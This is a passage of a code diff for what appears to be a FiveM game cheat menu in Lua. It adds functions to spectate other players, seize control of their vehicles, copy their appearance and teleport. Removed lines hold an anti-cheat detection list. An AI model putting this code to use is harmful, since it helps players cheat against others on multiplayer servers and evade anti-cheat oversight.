+        return camPos + (direction * 10.0)
+    end
+    
+    local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
+    local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
+    return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)
+
+end
+
+function WorldToScreenRel(worldCoords)
+    local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
+    if not check then
+        return false
+    end
+    
+    screenCoordsx = (x - 0.5) * 2.0
+    screenCoordsy = (y - 0.5) * 2.0
+    return true, screenCoordsx, screenCoordsy
+end
+
+function RotationToDirection(rotation)
+    local retz = math.rad(rotation.z)
+    local retx = math.rad(rotation.x)
+    local absx = math.abs(math.cos(retx))
+    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
+end
+
+local function GetCamDirection()
+    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
+    local pitch = GetGameplayCamRelativePitch()
+    
+    local x = -math.sin(heading * math.pi / 180.0)
+    local y = math.cos(heading * math.pi / 180.0)
+    local z = math.sin(pitch * math.pi / 180.0)
+    
+    local len = math.sqrt(x * x + y * y + z * z)
+    if len ~= 0 then
+        x = x / len
+        y = y / len
+        z = z / len
+    end
+    
+    return x, y, z
+end
+
+function ApplyForce(entity, direction)
+    ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
+end
+
+function RequestControlOnce(entity)
+    if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
+        return true
+    end
+    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
+    return NetworkRequestControlOfEntity(entity)
+end
+
+function RequestControl(entity)
+    Citizen.CreateThread(function()
+        local tick = 0
+        while not RequestControlOnce(entity) and tick <= 12 do
+            tick = tick + 1
             Wait(0)
+        end
+        return tick <= 12
+    end)
+end
 
-            if not FM.Config.ShowText then
-                text_alpha = _lerp(0.05, text_alpha, -255)
-            else
-                text_alpha = _lerp(0.05, text_alpha, 255)
+function Oscillate(entity, position, angleFreq, dampRatio)
+    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
+    local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
+    local targetPos = SubVectors(pos1, pos2)
+    
+    ApplyForce(entity, targetPos)
+end
+
+-- END MENYOO/ENTITY FUNCTIONS
+-- DRAWING FUNCTIONS
+function ShowMPMessage(message, subtitle, ms)
+    Citizen.CreateThread(function()
+        Citizen.Wait(0)
+        function Initialize(scaleform)
+            local scaleform = RequestScaleformMovie(scaleform)
+            while not HasScaleformMovieLoaded(scaleform) do
+                Citizen.Wait(0)
             end
-
-            text_alpha = dict.math.ceil(text_alpha)
-
-            if text_alpha > 0 then
-                local veh = FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("PlayerPedId")())
-                local br_wide = _text_width(branding.name)
-                local r_wide = _text_width(branding.resource)
-                local ip_wide = _text_width(branding.ip)
-                local id_wide = _text_width(branding.id)
-                local b_wide = _text_width(branding.build)
-                local v_wide
-                local curY = 0.895
-
-                if FM:GetFunction("DoesEntityExist")(veh) then
-                    v_wide = _text_width(v_str:format(GetDisplayNameFromVehicleModel(GetEntityModel(veh))))
-                    curY = 0.875
-                end
-
-                FM:ScreenText(branding.name, 4, 0.0, 1.0 - br_wide, curY, 0.35, 255, 255, 255, text_alpha)
-                curY = curY + 0.02
-                FM:ScreenText(branding.resource, 4, 0.0, 1.0 - r_wide, curY, 0.35, 255, 255, 255, text_alpha)
-                curY = curY + 0.02
-                FM:ScreenText(branding.ip, 4, 0.0, 1.0 - ip_wide, curY, 0.35, 255, 255, 255, text_alpha)
-                curY = curY + 0.02
-                FM:ScreenText(branding.id, 4, 0.0, 1.0 - id_wide, curY, 0.35, 255, 255, 255, text_alpha)
-                curY = curY + 0.02
-
-                if FM:GetFunction("DoesEntityExist")(veh) then
-                    FM:ScreenText(branding.veh:format(GetDisplayNameFromVehicleModel(GetEntityModel(veh))), 4, 0.0, 1.0 - v_wide, curY, 0.35, 255, 255, 255, text_alpha)
-                    curY = curY + 0.02
-                end
-
-                FM:ScreenText(branding.build, 4, 0.0, 1.0 - b_wide, curY, 0.35, 255, 255, 255, text_alpha)
-            end
+            PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
+            PushScaleformMovieFunctionParameterString(message)
+            PushScaleformMovieFunctionParameterString(subtitle)
+            PopScaleformMovieFunctionVoid()
+            Citizen.SetTimeout(6500, function()
+                PushScaleformMovieFunction(scaleform, "SHARD_ANIM_OUT")
+                PushScaleformMovieFunctionParameterInt(1)
+                PushScaleformMovieFunctionParameterFloat(0.33)
+                PopScaleformMovieFunctionVoid()
+                Citizen.SetTimeout(3000, function()EndScaleformMovieMethod() end)
+            end)
+            return scaleform
+        end
+        
+        scaleform = Initialize("mp_big_message_freemode")
+        
+        while true do
+            Citizen.Wait(0)
+            DrawScaleformMovieFullscreen(scaleform, 255, 255, 255, 150, 0)
         end
     end)
+end
 
-    local RList = {
-        {
-            Resource = "alpha-tango-golf",
-            Name = "~b~ATG",
-            Pattern = function(res, resources)
-                for k, v in dict.pairs(resources) do
-                    if v == res then return true end
+function ShowInfo(text)
+    SetNotificationTextEntry("STRING")
+    AddTextComponentString(text)
+    DrawNotification(true, false)
+end
+
+function DrawTxt(text, x, y, scale, size)
+    SetTextFont(0)
+    SetTextProportional(1)
+    SetTextScale(scale, size)
+    SetTextDropshadow(1, 0, 0, 0, 255)
+    SetTextEdge(1, 0, 0, 0, 255)
+    SetTextDropShadow()
+    SetTextOutline()
+    SetTextEntry("STRING")
+    AddTextComponentString(text)
+    DrawText(x, y)
+end
+
+function DrawText3D(x, y, z, text)
+    local onScreen, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)
+    local px, py, pz = table.unpack(GetGameplayCamCoords())
+    local dist = GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)
+    
+    local scale = (1 / dist) * 2
+    local fov = (1 / GetGameplayCamFov()) * 100
+    local scale = scale * fov
+    
+    if onScreen then
+        SetTextScale(0.0 * scale, 0.55 * scale)
+        SetTextFont(0)
+        SetTextProportional(1)
+        SetTextColour(255, 255, 255, 255)
+        SetTextDropshadow(0, 0, 0, 0, 255)
+        SetTextEdge(2, 0, 0, 0, 150)
+        SetTextDropShadow()
+        SetTextOutline()
+        SetTextEntry("STRING")
+        SetTextCentre(1)
+        AddTextComponentString(text)
+        DrawText(_x, _y)
+    end
+end
+
+local entityEnumerator = {
+    __gc = function(enum)
+        if enum.destructor and enum.handle then
+            enum.destructor(enum.handle)
+        end
+        enum.destructor = nil
+        enum.handle = nil
+    end
+}
+
+local function GetHeadItems()
+    local headItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 0)
+    local faceItemsList = {}
+    for i = 1, headItems do
+        faceItemsList[i] = i
+    end
+	return faceItemsList
+end
+
+local function GetHeadTextures(faceID)
+    local headTextures = GetNumberOfPedTextureVariations(PlayerPedId(), 0, faceID)
+	local headTexturesList = {}
+    for i = 1, headTextures do
+        headTexturesList[i] = i
+    end
+	return headTexturesList
+end
+
+local function GetHairItems()
+    local hairItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 2)
+    local hairItemsList = {}
+    for i = 1, hairItems do
+        hairItemsList[i] = i
+    end
+    return hairItemsList
+end
+
+local function GetHairTextures(hairID)
+    local hairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, hairID)
+    local hairTextureList = {}
+    for i = 1, hairTexture do
+        hairTextureList[i] = i
+    end
+    return hairTextureList
+end
+
+local function GetMaskItems()
+    local maskItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 1)
+    local maskItemsList = {}
+    for i = 1, maskItems do
+        maskItemsList[i] = i
+    end
+	return maskItemsList
+end
+
+local function GetHatItems()
+    local hatItems = GetNumberOfPedPropDrawableVariations(PlayerPedId(), 0)
+    local hatItemsList = {}
+    for i = 1, hatItems do
+        hatItemsList[i] = i
+    end
+	return hatItemsList
+end
+
+local function GetHatTextures(hatID)
+	local hatTextures = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, hatID)
+	local hatTexturesList = {}
+	for i = 1, hatTextures do
+        hatTexturesList[i] = i
+    end
+	return hatTexturesList
+end
+
+local function ClonePed(target)
+        local ped = GetPlayerPed(target)
+        local me = PlayerPedId()
+
+        hat = GetPedPropIndex(ped, 0)
+        hat_texture = GetPedPropTextureIndex(ped, 0)
+
+        glasses = GetPedPropIndex(ped, 1)
+        glasses_texture = GetPedPropTextureIndex(ped, 1)
+
+        ear = GetPedPropIndex(ped, 2)
+        ear_texture = GetPedPropTextureIndex(ped, 2)
+
+        watch = GetPedPropIndex(ped, 6)
+        watch_texture = GetPedPropTextureIndex(ped, 6)
+
+        wrist = GetPedPropIndex(ped, 7)
+        wrist_texture = GetPedPropTextureIndex(ped, 7)
+
+        head_drawable = GetPedDrawableVariation(ped, 0)
+        head_palette = GetPedPaletteVariation(ped, 0)
+        head_texture = GetPedTextureVariation(ped, 0)
+
+        beard_drawable = GetPedDrawableVariation(ped, 1)
+        beard_palette = GetPedPaletteVariation(ped, 1)
+        beard_texture = GetPedTextureVariation(ped, 1)
+
+        hair_drawable = GetPedDrawableVariation(ped, 2)
+        hair_palette = GetPedPaletteVariation(ped, 2)
+        hair_texture = GetPedTextureVariation(ped, 2)
+
+        torso_drawable = GetPedDrawableVariation(ped, 3)
+        torso_palette = GetPedPaletteVariation(ped, 3)
+        torso_texture = GetPedTextureVariation(ped, 3)
+
+        legs_drawable = GetPedDrawableVariation(ped, 4)
+        legs_palette = GetPedPaletteVariation(ped, 4)
+        legs_texture = GetPedTextureVariation(ped, 4)
+
+        hands_drawable = GetPedDrawableVariation(ped, 5)
+        hands_palette = GetPedPaletteVariation(ped, 5)
+        hands_texture = GetPedTextureVariation(ped, 5)
+
+        foot_drawable = GetPedDrawableVariation(ped, 6)
+        foot_palette = GetPedPaletteVariation(ped, 6)
+        foot_texture = GetPedTextureVariation(ped, 6)
+
+        acc1_drawable = GetPedDrawableVariation(ped, 7)
+        acc1_palette = GetPedPaletteVariation(ped, 7)
+        acc1_texture = GetPedTextureVariation(ped, 7)
+
+        acc2_drawable = GetPedDrawableVariation(ped, 8)
+        acc2_palette = GetPedPaletteVariation(ped, 8)
+        acc2_texture = GetPedTextureVariation(ped, 8)
+
+        acc3_drawable = GetPedDrawableVariation(ped, 9)
+        acc3_palette = GetPedPaletteVariation(ped, 9)
+        acc3_texture = GetPedTextureVariation(ped, 9)
+
+        mask_drawable = GetPedDrawableVariation(ped, 10)
+        mask_palette = GetPedPaletteVariation(ped, 10)
+        mask_texture = GetPedTextureVariation(ped, 10)
+
+        aux_drawable = GetPedDrawableVariation(ped, 11)
+        aux_palette = GetPedPaletteVariation(ped, 11)
+        aux_texture = GetPedTextureVariation(ped, 11)
+
+        SetPedPropIndex(me, 0, hat, hat_texture, 1)
+        SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
+        SetPedPropIndex(me, 2, ear, ear_texture, 1)
+        SetPedPropIndex(me, 6, watch, watch_texture, 1)
+        SetPedPropIndex(me, 7, wrist, wrist_texture, 1)
+
+        SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
+        SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
+        SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
+        SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
+        SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
+        SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
+        SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
+        SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
+        SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
+        SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
+        SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
+        SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
+end
+
+
+local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
+    return coroutine.wrap(function()
+        local iter, id = initFunc()
+        if not id or id == 0 then
+            disposeFunc(iter)
+            return
+        end
+        
+        local enum = {handle = iter, destructor = disposeFunc}
+        setmetatable(enum, entityEnumerator)
+        
+        local next = true
+        repeat
+            coroutine.yield(id)
+            next, id = moveFunc(iter)
+        until not next
+        
+        enum.destructor, enum.handle = nil, nil
+        disposeFunc(iter)
+    end)
+end
+
+function EnumerateObjects()
+    return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
+end
+
+function EnumeratePeds()
+    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
+end
+
+function EnumerateVehicles()
+    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
+end
+
+function EnumeratePickups()
+    return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
+end
+
+function table.contains(table, element)
+    for _, value in pairs(table) do
+        if value == element then
+            return true
+        end
+    end
+    return false
+end
+
+function table.removekey(array, element)
+    for i = 1, #array do
+        if array[i] == element then
+            table.remove(array, i)
+        end
+    end
+end
+
+function AddVectors(vect1, vect2)
+    return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
+end
+
+function SubVectors(vect1, vect2)
+    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
+end
+
+function ScaleVector(vect, mult)
+    return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
+end
+
+function round(num, numDecimalPlaces)
+    local mult = 10 ^ (numDecimalPlaces or 0)
+    return math.floor(num * mult + 0.5) / mult
+end
+
+local function GetKeyboardInput(text)
+	if not text then text = "Input" end
+    DisplayOnscreenKeyboard(0, "", "", "", "", "", "", 30)
+    while (UpdateOnscreenKeyboard() == 0) do
+		DrawTxt(text, 0.32, 0.37, 0.0, 0.4)
+        DisableAllControlActions(0)
+
+        if IsDisabledControlPressed(0, Keys["ESC"]) then return "" end
+        Wait(0)
+    end
+    if (GetOnscreenKeyboardResult()) then
+        local result = GetOnscreenKeyboardResult()
+        Wait(0)
+        return result
+    end
+end
+
+function SpectatePlayer(id)
+    local player = GetPlayerPed(id)
+    if Spectating then
+        RequestCollisionAtCoord(GetEntityCoords(player))
+        NetworkSetInSpectatorMode(true, player)
+    else
+        RequestCollisionAtCoord(GetEntityCoords(player))
+        NetworkSetInSpectatorMode(false, player)
+    end
+end
+
+local function k(l)
+    local m = {}
+    local n = GetGameTimer() / 200
+    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
+    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
+    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
+    return m
+end
+
+local function PossessVehicle(target)
+    PossessingVeh = not PossessingVeh
+    
+    if not PossessingVeh then
+        SetEntityVisible(PlayerPedId(), true, 0)
+        SetEntityCoords(PlayerPedId(), oldPlayerPos)
+        SetEntityCollision(PlayerPedId(), true, 1)
+    else
+        SpectatePlayer(selectedPlayer)
+        ShowInfo("~b~Checking Player...")
+        Wait(3000)
+        if IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
+            SpectatePlayer(selectedPlayer)
+            oldPlayerPos = GetEntityCoords(PlayerPedId())
+            SetEntityVisible(PlayerPedId(), false, 0)
+            SetEntityCollision(PlayerPedId(), false, 0)
+        else
+            SpectatePlayer(selectedPlayer)
+            PossessingVeh = false
+            ShowInfo("~r~Player not in a vehicle!  (Try again?)")
+        end
+        
+        
+        local Markerloc = nil
+        
+
+        Citizen.CreateThread(function()
+            local ped = GetPlayerPed(target)
+            local veh = GetVehiclePedIsIn(ped, 0)
+            
+            while PossessingVeh do
+                
+                DrawTxt("~b~Possessing " .. GetPlayerName(target) .. "'s ~b~Vehicle", 0.1, 0.05, 0.0, 0.4)
+                DrawTxt("~b~Controls:\n-------------------", 0.1, 0.2, 0.0, 0.4)
+                DrawTxt("~b~W/S: Forward/Back\n~b~SPACEBAR: Up\n~b~CTRL: Down\n~b~X: Cancel", 0.1, 0.25, 0.0, 0.4)
+                Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
+                DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 0, 0, 180, 35, false, true, 2, nil, nil, false)
+                
+                local forward = SubVectors(Markerloc, GetEntityCoords(veh))
+                local vpos = GetEntityCoords(veh)
+                local vf = GetEntityForwardVector(veh)
+                local vrel = SubVectors(vpos, vf)
+                
+                SetEntityCoords(PlayerPedId(), vrel.x, vrel.y, vpos.z + 1.1)
+                SetEntityNoCollisionEntity(PlayerPedId(), veh, 1)
+                
+                RequestControlOnce(veh)
+                
+                if IsDisabledControlPressed(0, Keys["W"]) then
+                    ApplyForce(veh, forward * 0.1)
                 end
-
-                return false
-            end
-        },
-        {
-            Resource = "screenshot-basic",
-            Name = "~g~screenshot-basic",
-            Pattern = function(res, resources)
-                for k, v in dict.pairs(resources) do
-                    if v == res then return true end
+                
+                if IsDisabledControlPressed(0, Keys["S"]) then
+                    ApplyForce(veh, -(forward * 0.1))
                 end
-
-                return false
-            end
-        },
-        {
-            Resource = "anticheese-anticheat",
-            Name = "~g~AntiCheese",
-            Pattern = function(res, resources)
-                for k, v in dict.pairs(resources) do
-                    if v == res then return true end
+                
+                if IsDisabledControlPressed(0, Keys["SPACE"]) then
+                    ApplyForceToEntity(veh, 3, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                 end
-
-                return false
+                
+                if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then
+                    ApplyForceToEntity(veh, 3, 0.0, 0.0, -1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
+                end
+                
+                if IsDisabledControlPressed(0, Keys["X"]) or GetEntityHealth(PlayerPedId()) < 5.0 then
+                    PossessingVeh = false
+                    SetEntityVisible(PlayerPedId(), true, 0)
+                    SetEntityCoords(PlayerPedId(), oldPlayerPos)
+                    SetEntityCollision(PlayerPedId(), true, 1)
+                end
+                
+                Wait(0)
             end
-        },
-        {
-            Resource = "ChocoHax",
-            Name = "~r~ChocoHax",
-            Pattern = function() return ChXaC ~= nil end
-        }
-    }
+        end)
+    end
+end
 
-    local resources = {}
-
-    function FM:RunACChecker()
-        FM:Print("[AC Checker] Checking...")
-
-        for i = 1, FM:GetFunction("GetNumResources")() do
-            resources[i] = FM:GetFunction("GetResourceByFindIndex")(i)
+function GetWeaponNameFromHash(hash)
+    for i = 1, #allweapons do
+        if GetHashKey(allweapons[i]) == hash then
+            return string.sub(allweapons[i], 8)
         end
+    end
+end
 
-        for _, dat in dict.pairs(RList) do
-            if dat.Pattern(dat.Resource, resources) then
-                self:AddNotification("WARN", dat.Name .. " ~w~Detected!", 30000)
-                FM:Print("[AC Checker] Found ^3" .. dat.Resource .. "^7")
+function TeleportToCoords()
+    local x = GetKeyboardInput("Enter ~r~X ~s~Coordinates", "", 100)
+    local y = GetKeyboardInput("Enter ~r~Y ~s~Coordinates", "", 100)
+    local z = GetKeyboardInput("Enter ~r~Z ~s~Coordinates", "", 100)
+    local entity
+    if x ~= "" and y ~= "" and z ~= "" then
+        if IsPedInAnyVehicle(GetPlayerPed(-1),0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1) then
+            entity = GetVehiclePedIsIn(GetPlayerPed(-1),0)
+        else
+            entity = PlayerPedId()
+        end
+        if entity then
+            SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
+        end
+    else
+        ShowInfo("~r~Invalid Coordinates!")
+    end
+end
+
+
+local function fbi()
+    local bB = 160.868
+    local bC = -745.831
+    local bD = 250.063
+    if bB ~= '' and bC ~= '' and bD ~= '' then
+        if
+            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
+                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
+         then
+            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
+        else
+            entity = GetPlayerPed(-1)
+        end
+        if entity then
+            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
+        end
+    end
+	
+end
+
+local function ls()
+    local bB = -365.425
+    local bC = -131.809
+    local bD = 37.873
+    if bB ~= '' and bC ~= '' and bD ~= '' then
+        if
+            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
+                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
+         then
+            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
+        else
+            entity = GetPlayerPed(-1)
+        end
+        if entity then
+            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
+        end
+    end
+	
+end
+
+local function gp()
+    local bB = 266.12
+    local bC = -752.51
+    local bD = 34.64
+    if bB ~= '' and bC ~= '' and bD ~= '' then
+        if
+            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
+                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
+         then
+            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
+        else
+            entity = GetPlayerPed(-1)
+        end
+        if entity then
+            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
+        end
+    end
+	
+end
+
+local function dealership()
+    local bB = -15.32
+    local bC = -1080.69
+    local bD = 26.14
+    if bB ~= '' and bC ~= '' and bD ~= '' then
+        if
+            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
+                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
+         then
+            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
+        else
+            entity = GetPlayerPed(-1)
+        end
+        if entity then
+            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
+        end
+    end
+	
+end
+
+local function Ammunation()
+    local bB = 19.22
+    local bC = -1108.71
+    local bD = 29.8
+    if bB ~= '' and bC ~= '' and bD ~= '' then
+        if
+            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
+                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
+         then
+            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
+        else
+            entity = GetPlayerPed(-1)
+        end
+        if entity then
+            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
+        end
+    end
+	
+end
+
+local function shopclothes()
+    local bB = 428.61
+    local bC = -799.89
+    local bD = 29.49
+    if bB ~= '' and bC ~= '' and bD ~= '' then
+        if
+            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
+                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
+         then
+            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
+        else
+            entity = GetPlayerPed(-1)
+        end
+        if entity then
+            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
+        end
+    end
+	
+end
+
+local function barber()
+    local bB = -32.84
+    local bC = -152.34
+    local bD = 57.08
+    if bB ~= '' and bC ~= '' and bD ~= '' then
+        if
+            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
+                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
+         then
+            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
+        else
+            entity = GetPlayerPed(-1)
+        end
+        if entity then
+            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
+        end
+    end
+	
+end
+
+
+function MaxOut(veh)
+    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
+    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
+    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
+    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
+    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
+    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
+    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
+    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
+    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
+    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
+    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
+end
+
+function engine(veh)
